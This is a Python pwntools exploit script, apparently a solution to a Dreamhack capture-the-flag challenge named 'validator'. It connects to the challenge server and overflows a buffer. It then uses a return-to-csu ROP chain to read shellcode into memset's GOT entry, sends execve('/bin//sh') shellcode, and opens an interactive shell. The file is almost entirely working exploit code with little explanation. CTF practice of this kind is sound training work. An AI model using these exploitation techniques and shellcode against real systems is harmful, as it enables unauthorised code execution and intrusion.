from pwn import *

p = remote("host1.dreamhack.games", 8752)
# p = process("./validator_dist")
e = ELF("./validator_dist")

# gdb.attach(p)

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'
# bss = e.bss()
buf2ret = 0x80+0x8
dreamhack = b"DREAMHACK!" 

pop_rdi = 0x00000000004006f3
pop_rsi_r15 = 0x00000000004006f1

csu_pop = 0x00000000004006E6
csu_mov = 0x00000000004006D0

memset_got = e.got["memset"]
memset_plt = e.plt["memset"]
read_plt = e.plt["read"]
read_got = e.got["read"]

slog("memset_got", memset_got)
slog("read_got", read_got)

hex_val = []

for i in range((buf2ret - len(dreamhack)- 8),0,-1):
    hex_val.append(i)

hexval = bytearray(hex_val)

# why not..?
# shell_code = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
shell_code = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

payload = dreamhack #10
# payload += b"\x00"
payload += hexval
payload += p64(0)
payload += p64(csu_pop)
payload += p64(0) #rbx
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(read_got) #read()
payload += p64(0) #r13(edi)
payload += p64(memset_got) #r14(rsi)
payload += p64(len(shell_code)+1) #r15(rdx)
payload += p64(csu_mov)
payload += p64(0) #add rsp, 8
payload += p64(0) #add rsp, 8
payload += p64(0) #add rsp, 8
payload += p64(0) #add rsp, 8
payload += p64(0) #add rsp, 8
payload += p64(0) #add rsp, 8
payload += p64(0) #add rsp, 8
payload += p64(memset_got)

p.send(payload)
p.send(shell_code)

p.interactive()